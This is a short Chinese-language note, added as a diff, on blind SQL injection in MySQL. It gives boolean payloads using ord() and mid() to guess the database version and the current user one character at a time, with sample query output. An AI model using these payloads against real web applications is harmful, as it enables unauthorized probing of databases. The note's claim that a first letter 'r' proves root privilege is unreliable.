@@ -1,0 +1,21 @@
+and ord(mid(version(),1,1))=53 //代表MYSQL版本为开头为5： 原理：mid获取version当前数据库的版本的第一个字符，如果等于ASCII码的53就返回正确 
+and ord(mid(user(),1,1))=114 //代表当前用户为root权限 原理：mid获取user()第一个字符，如果等于ASCII码的r代表是root权限
+ord() //将字符转换为ASCII码
+mid() //读取指定字符的位置到指定的位置
+
+ord使用例子：
+mysql> select ord('h');
++----------+
+| ord('h') |
++----------+
+|      104 |
++----------+
+
+mid使用例子：
+mysql> select mid(user(),1,1); //代表读取user()的从1到1的位置
++-----------------+
+| mid(user(),1,1) |
++-----------------+
+| r               |
++-----------------+
+1 row in set (0.00 sec)
